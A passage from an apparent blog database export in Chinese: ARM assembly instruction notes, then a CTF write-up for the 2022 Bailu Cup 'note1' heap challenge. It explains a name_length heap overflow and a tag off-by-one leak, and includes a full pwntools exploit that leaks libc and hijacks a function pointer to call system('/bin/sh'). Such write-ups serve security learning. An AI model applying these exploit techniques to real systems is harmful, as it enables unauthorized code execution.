&lt;reg3/imm32&gt;&#125;：如果reg3/imm存在，则表示reg1=&lt;reg2&gt;(&gt;&gt;/&lt;&lt;)&lt;reg3/imm32&gt;，否则表示reg1=reg1(&gt;&gt;/&lt;&lt;)&lt;reg2&gt;（算数右移、逻辑左移、逻辑右移）</span><br><span class=\"line\">ROR reg1, &lt;reg2&gt;&#123;, reg3&#125;：如果reg3存在，则表示reg1=&lt;reg2&gt;(&gt;&gt;)reg3，否则表示reg1=reg1(&gt;&gt;)&lt;reg2&gt;（循环右移）</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"数据取反\"><a href=\"#数据取反\" class=\"headerlink\" title=\"数据取反\"></a>数据取反</h4><p>将寄存器中的值按字节进行取反。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">REV reg1, reg2：将reg2中的4字节数据按字节反转后赋值给reg1（reg2值不变），原先第0，1，2，3字节的内容被换到了第3，2，1，0字节。</span><br><span class=\"line\">REV16 reg1, reg2：将reg2中的4字节以字单位分为高字和低字分别进行反转后赋值给reg1（reg2值不变），原先第0，1，2，3字节的内容被换到了第1，0，3，2字节。</span><br><span class=\"line\">REVSH reg1, reg2：将reg2中的低2字节反转后有符号扩展赋值给reg1</span><br><span class=\"line\">REVH reg1, reg2：REV指令的16位表示，只反转低2字节。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"位域操作\"><a href=\"#位域操作\" class=\"headerlink\" title=\"位域操作\"></a>位域操作</h4><p>位域操作允许机器指令对寄存器中的特定位进行处理，在x86中好像是也有这样的指令，只是使用频率太低。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BFD reg1, #lsb, #width：将reg1中从第lsb位开始的连续width位清零。</span><br><span class=\"line\">BFI reg1, reg2, #lsb, #width：将reg2中最低width位复制到reg1中从lsb位开始的连续width位。</span><br><span class=\"line\">CLZ reg1, reg2：计算reg2中高位0的个数并赋值给reg1，多用于浮点数计算。</span><br><span class=\"line\">RBIT reg1, reg2：反转reg2寄存器中的所有位并赋值给reg1。</span><br><span class=\"line\">SBFX/UBFX reg1, reg2, #lsb, #width：取reg2中从第lsb位开始的连续width位并有/无符号扩展，赋值给reg1。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"比较和测试指令\"><a href=\"#比较和测试指令\" class=\"headerlink\" title=\"比较和测试指令\"></a>比较和测试指令</h4><p>与x86使用cmp指令和test指令相似，ARM也有关于比较和测试的指令，且实现原理基本相同。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CMP reg1, reg2/imm：比较两个寄存器或寄存器与立即数，更新标志位APSR。</span><br><span class=\"line\">CMN reg1, reg2/imm：比较reg1和-reg2或-imm，更新标志位APSR。</span><br><span class=\"line\">TST reg1, reg2/imm：参照x86的test指令，相与测试，更新N（负数位）和Z（零）标志</span><br><span class=\"line\">TEQ reg1, reg2/imm：异或测试，更新N和Z标志</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"跳转指令\"><a href=\"#跳转指令\" class=\"headerlink\" title=\"跳转指令\"></a>跳转指令</h4><p><code>B</code>系列的位跳转指令，<code>BL</code>相当于<code>call</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">B/B.W &lt;label&gt;：无条件跳转到指定位置，B.W跳转范围更大。</span><br><span class=\"line\">BX reg：寄存器跳转。</span><br><span class=\"line\">BL &lt;label&gt; / BLX reg：跳转到指定位置/寄存器值，且将返回地址保存到LR寄存器中，类比x86的call指令。一般在函数开头都会首先将BL寄存器的值保存到栈中便于返回时获取。</span><br><span class=\"line\">条件跳转指令族：类比x86指令：</span><br><span class=\"line\">BEQ == je</span><br><span class=\"line\">BNE == jne</span><br><span class=\"line\">BCS/BHS == jc（进位标志为1，可表示无符号大于等于）</span><br><span class=\"line\">BCC/BLO == jnc（进位标志为0，可表示无符号小于）</span><br><span class=\"line\">BMI == js（负数标志为1）</span><br><span class=\"line\">BPL == jns（负数标志为0）</span><br><span class=\"line\">BVS == jo（溢出标志为1）</span><br><span class=\"line\">BVC == jno（溢出标志为0）</span><br><span class=\"line\">BHI == ja（无符号大于）</span><br><span class=\"line\">BLS == jbe（无符号小于等于）</span><br><span class=\"line\">BGE == jge（有符号大于等于）</span><br><span class=\"line\">BLE == jle（有符号小于等于）</span><br><span class=\"line\">BGT == jg（有符号大于）</span><br><span class=\"line\">BLT == jl（有符号小于）</span><br><span class=\"line\">CBZ/CBNZ reg, &lt;label&gt;：比较寄存器的值为0/不为0时跳转（只支持前向跳转）</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解题技巧\"><a href=\"#解题技巧\" class=\"headerlink\" title=\"解题技巧\"></a>解题技巧</h2><ol>\n<li>arm pwn程序在IDA反汇编后通常都是一大堆sub函数，有许多常用的函数都没有符号，这时<strong>不要硬逆</strong>。arm程序逻辑较为简单，可通过<strong>运行</strong>大致猜测是什么函数。<strong>（三分逆，七分猜</strong></li>\n<li>栈溢出时覆盖<code>LR</code>在栈上的位置，并通过劫持<code>PC</code>不断控制执行流。</li>\n<li>在面对静态链接的程序，IDA打开之后会发现里面有几百个函数，而且也搜不到main函数，在这种情况下，可以利用搜<strong>索关键字符串，通过关键字符串去找主函数</strong>。</li>\n</ol>"},{"title":"2022柏鹭杯note1","date":"2023-01-02T11:54:26.000Z","_content":"2022柏鹭杯note1，主要是对堆溢出的利用。\n<!-- more -->\n一道菜单堆题，查壳后发现保护全开。\n\n结构体如下：\n\n```c\nstruct note\n{\n    QWORD tag;\n    int func(int);\n    char* name;\n    QWORD name_length;\n}\n\n```\n\n具有new、edit、func三个功能，仅允许有2个chunk。\n\nnew功能就是note=malloc(0x20)，然后输入各项数据，对\\x00也有注意（fgets会自动在最后一个字节变为\\x00），没有什么可以利用的地方，需要注意的是name=malloc(n+1)，会多申请一点来放\\x00。\n\nedit功能分为edit_name,edit_tag,edit_func。\n\nedit_name中如果新的name_length与原来的name_length不一样，就会free原来的name，malloc一个新的chunk写入name。**问题是在这里并没有把新的name_length写到note的对应位置中，下次edit时仍以原来的name作为标准**。因此如果开始时设置name_length较大，后面edit一个较小的name时就可以实现一个**堆溢出**。\n\nedit_tag会修改tag，与new不同的是，这里用的是scanf(\"%8s\")，因此**可以写9字节（最后一字节为\\x00）**，写完后会覆盖一位func的地址，不过调用edit就可以改回去了，泄露func的地址，减去偏移可以得到textbase。\n\nedit_func就是调用函数修改函数指针，没有可以利用的地方，不同的func只是保存地址不同，功能完全一样。\n\nfunc功能执行\n\n```c\n(*(void (__fastcall **)(_QWORD))(chunk_list[id_call] + 8LL))(chunk_list[id_call]);\n\nint __fastcall fun1(__int64 a1)\n{\n  puts(\"--------fun1--------\");\n  printf(\"tag: %s\\n\", (const char *)a1);\n  printf(\"name: %s\\n\", *(const char **)(a1 + 16));\n  return puts(\"--------------------\");\n}\n```\n\n输出tag和name，可以利用堆溢出修改name位置的指针来泄露libc。\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nelf=ELF(\"./note3\")\nlibc=ELF(\"./libc.so.6\") #BaiLucup use 2.31 9.9\n#use 2.31 9.7 to debug in local\np=process(\"./note3\")\n\ndef add(Id, length, name, tag, func):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"1\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\tp.recvuntil(\"name_length: \")\n\tp.sendline(str(length))\n\tp.recvuntil(\"name: \")\n\tp.sendline(name)\n\tp.recvuntil(\"tag: \")\n\tp.sendline(tag)\n\tp.recvuntil(\"func: \")\n\tp.sendline(str(func))\n\ndef edit_name(Id, length, name):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\tp.recvuntil(\"> \")\n\tp.sendline(\"1\")\n\tp.recvuntil(\"name_length: \")\n\tp.sendline(str(length))\n\tp.recvuntil(\"name: \")\n\tp.sendline(name)\n\ndef edit_tag(Id, tag):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"new tag: \")\n\tp.sendline(tag)\n\ndef edit_func(Id, func):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\tp.recvuntil(\"> \")\n\tp.sendline(\"3\")\n\tp.recvuntil(\"func: \")\n\tp.sendline(str(func))\n\ndef funcall(Id):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"3\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\ndef debug():\n    gdb.attach(p)\n    pause()\n\n#一开始把num_length设大，方便后面溢出\nadd(0,0x200,'a'*0x1ee,'ccccddd',1)\n#通过edit_name把chunk改小，由此可以溢出\nedit_name(0,0x10,'aaaabbbb')\nadd(1,0x20,'eeeeffff','bbbbbbb',2)\n\n\n#leak textbase\n\nedit_tag(0,'a'*0x8)\n#edit_tag后func字段的最低位会被'\\x00'覆盖，因此调用edit_func去把func字段改好\nedit_func(0,2)\nfuncall(0)\np.recvline()\np.recvuntil('a'*0x8)\n#泄露出func2的地址\ndata=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))\n#减去func2的偏移即可得到textbase\ntextbase=data-0x137A\nprint(\"[*]textbase: {:}\".format(hex(textbase)))\n\n#leak libcbase\n#因为开了PIE，不要忘了加上textbase，将name字段覆盖为got表中puts表项，输出puts的真实地址\n#顺便把num_length字段写了是因为edit会在后面追加'\\x0a\\x00'怕出问题\npayload='a'*0x10+'\\x00'*0x8+p64(0x31)+'a'*0x7+'\\x00'+p64(textbase+0x137A)+p64(textbase+elf.got['puts'])+p64(9)\nedit_name(0,0x1ef,payload)\n\nfuncall(1)\n# data=p.recv()\n# print(data)\np.recvline()\np.recvline()\np.recvuntil('name: ')\ndata=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))\nlibcbase=data-libc.sym['puts']\n#print(\"[*]data: {:}\".format(hex(data)))\nprint(\"[*]libcbase: {:}\".format(hex(libcbase)))\ndebug()\n#get shell\npayload='a'*0x10+'\\x00'*0x8+p64(0x31)+'/bin/sh\\x00'+p64(libcbase+libc.sym['system'])+p64(textbase+elf.got['puts'])+p64(9)\nedit_name(0,0x1ef,payload)\n\nfuncall(1)\n\np.interactive()\n\n```","source":"_posts/BaiLu_note1.md","raw":"---\ntitle: 2022柏鹭杯note1\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n---\n2022柏鹭杯note1，主要是对堆溢出的利用。\n<!-- more -->\n一道菜单堆题，查壳后发现保护全开。\n\n结构体如下：\n\n```c\nstruct note\n{\n    QWORD tag;\n    int func(int);\n    char* name;\n    QWORD name_length;\n}\n\n```\n\n具有new、edit、func三个功能，仅允许有2个chunk。\n\nnew功能就是note=malloc(0x20)，然后输入各项数据，对\\x00也有注意（fgets会自动在最后一个字节变为\\x00），没有什么可以利用的地方，需要注意的是name=malloc(n+1)，会多申请一点来放\\x00。\n\nedit功能分为edit_name,edit_tag,edit_func。\n\nedit_name中如果新的name_length与原来的name_length不一样，就会free原来的name，malloc一个新的chunk写入name。**问题是在这里并没有把新的name_length写到note的对应位置中，下次edit时仍以原来的name作为标准**。因此如果开始时设置name_length较大，后面edit一个较小的name时就可以实现一个**堆溢出**。\n\nedit_tag会修改tag，与new不同的是，这里用的是scanf(\"%8s\")，因此**可以写9字节（最后一字节为\\x00）**，写完后会覆盖一位func的地址，不过调用edit就可以改回去了，泄露func的地址，减去偏移可以得到textbase。\n\nedit_func就是调用函数修改函数指针，没有可以利用的地方，不同的func只是保存地址不同，功能完全一样。\n\nfunc功能执行\n\n```c\n(*(void (__fastcall **)(_QWORD))(chunk_list[id_call] + 8LL))(chunk_list[id_call]);\n\nint __fastcall fun1(__int64 a1)\n{\n  puts(\"--------fun1--------\");\n  printf(\"tag: %s\\n\", (const char *)a1);\n  printf(\"name: %s\\n\", *(const char **)(a1 + 16));\n  return puts(\"--------------------\");\n}\n```\n\n输出tag和name，可以利用堆溢出修改name位置的指针来泄露libc。\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nelf=ELF(\"./note3\")\nlibc=ELF(\"./libc.so.6\") #BaiLucup use 2.31 9.9\n#use 2.31 9.7 to debug in local\np=process(\"./note3\")\n\ndef add(Id, length, name, tag, func):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"1\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\tp.recvuntil(\"name_length: \")\n\tp.sendline(str(length))\n\tp.recvuntil(\"name: \")\n\tp.sendline(name)\n\tp.recvuntil(\"tag: \")\n\tp.sendline(tag)\n\tp.recvuntil(\"func: \")\n\tp.sendline(str(func))\n\ndef edit_name(Id, length, name):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\tp.recvuntil(\"> \")\n\tp.sendline(\"1\")\n\tp.recvuntil(\"name_length: \")\n\tp.sendline(str(length))\n\tp.recvuntil(\"name: \")\n\tp.sendline(name)\n\ndef edit_tag(Id, tag):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"new tag: \")\n\tp.sendline(tag)\n\ndef edit_func(Id, func):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\tp.recvuntil(\"> \")\n\tp.sendline(\"3\")\n\tp.recvuntil(\"func: \")\n\tp.sendline(str(func))\n\ndef funcall(Id):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"3\")\n\tp.recvuntil(\"id: \")\n\tp.sendline(str(Id))\n\ndef debug():\n    gdb.attach(p)\n    pause()\n\n#一开始把num_length设大，方便后面溢出\nadd(0,0x200,'a'*0x1ee,'ccccddd',1)\n#通过edit_name把chunk改小，由此可以溢出\nedit_name(0,0x10,'aaaabbbb')\nadd(1,0x20,'eeeeffff','bbbbbbb',2)\n\n\n#leak textbase\n\nedit_tag(0,'a'*0x8)\n#edit_tag后func字段的最低位会被'\\x00'覆盖，因此调用edit_func去把func字段改好\nedit_func(0,2)\nfuncall(0)\np.recvline()\np.recvuntil('a'*0x8)\n#泄露出func2的地址\ndata=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))\n#减去func2的偏移即可得到textbase\ntextbase=data-0x137A\nprint(\"[*]textbase: {:}\".format(hex(textbase)))\n\n#leak libcbase\n#因为开了PIE，不要忘了加上textbase，将name字段覆盖为got表中puts表项，输出puts的真实地址\n#顺便把num_length字段写了是因为edit会在后面追加'\\x0a\\x00'怕出问题\npayload='a'*0x10+'\\x00'*0x8+p64(0x31)+'a'*0x7+'\\x00'+p64(textbase+0x137A)+p64(textbase+elf.got['puts'])+p64(9)\nedit_name(0,0x1ef,payload)\n\nfuncall(1)\n# data=p.recv()\n# print(data)\np.recvline()\np.recvline()\np.recvuntil('name: ')\ndata=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))\nlibcbase=data-libc.sym['puts']\n#print(\"[*]data: {:}\".format(hex(data)))\nprint(\"[*]libcbase: {:}\".format(hex(libcbase)))\ndebug()\n#get shell\npayload='a'*0x10+'\\x00'*0x8+p64(0x31)+'/bin/sh\\x00'+p64(libcbase+libc.sym['system'])+p64(textbase+elf.got['puts'])+p64(9)\nedit_name(0,0x1ef,payload)\n\nfuncall(1)\n\np.interactive()\n\n```","slug":"BaiLu_note1","published":1,"updated":"2023-01-02T13:54:50.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaex00085oudh9qa1v8t","content":"<p>2022柏鹭杯note1，主要是对堆溢出的利用。</p>\n<span id=\"more\"></span>\n<p>一道菜单堆题，查壳后发现保护全开。</p>\n<p>结构体如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">note</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    QWORD tag;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span>* name;</span><br><span class=\"line\">    QWORD name_length;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>具有new、edit、func三个功能，仅允许有2个chunk。</p>\n<p>new功能就是note=malloc(0x20)，然后输入各项数据，对\\x00也有注意（fgets会自动在最后一个字节变为\\x00），没有什么可以利用的地方，需要注意的是name=malloc(n+1)，会多申请一点来放\\x00。</p>\n<p>edit功能分为edit_name,edit_tag,edit_func。</p>\n<p>edit_name中如果新的name_length与原来的name_length不一样，就会free原来的name，malloc一个新的chunk写入name。<strong>问题是在这里并没有把新的name_length写到note的对应位置中，下次edit时仍以原来的name作为标准</strong>。因此如果开始时设置name_length较大，后面edit一个较小的name时就可以实现一个<strong>堆溢出</strong>。</p>\n<p>edit_tag会修改tag，与new不同的是，这里用的是scanf(“%8s”)，因此<strong>可以写9字节（最后一字节为\\x00）</strong>，写完后会覆盖一位func的地址，不过调用edit就可以改回去了，泄露func的地址，减去偏移可以得到textbase。</p>\n<p>edit_func就是调用函数修改函数指针，没有可以利用的地方，不同的func只是保存地址不同，功能完全一样。</p>\n<p>func功能执行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(*(<span class=\"type\">void</span> (__fastcall **)(_QWORD))(chunk_list[id_call] + <span class=\"number\">8LL</span>))(chunk_list[id_call]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">fun1</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------fun1--------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;tag: %s\\n&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)a1);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name: %s\\n&quot;</span>, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(a1 + <span class=\"number\">16</span>));</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------------------&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>输出tag和name，可以利用堆溢出修改name位置的指针来泄露libc。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./note3&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>) <span class=\"comment\">#BaiLucup use 2.31 9.9</span></span><br><span class=\"line\"><span class=\"comment\">#use 2.31 9.7 to debug in local</span></span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./note3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">Id, length, name, tag, func</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name_length: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;tag: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(tag)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;func: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(func))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit_name</span>(<span class=\"params\">Id, length, name</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name_length: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit_tag</span>(<span class=\"params\">Id, tag</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;new tag: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(tag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit_func</span>(<span class=\"params\">Id, func</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;func: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(func))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">funcall</span>(<span class=\"params\">Id</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#一开始把num_length设大，方便后面溢出</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x200</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1ee</span>,<span class=\"string\">&#x27;ccccddd&#x27;</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#通过edit_name把chunk改小，由此可以溢出</span></span><br><span class=\"line\">edit_name(<span class=\"number\">0</span>,<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;aaaabbbb&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;eeeeffff&#x27;</span>,<span 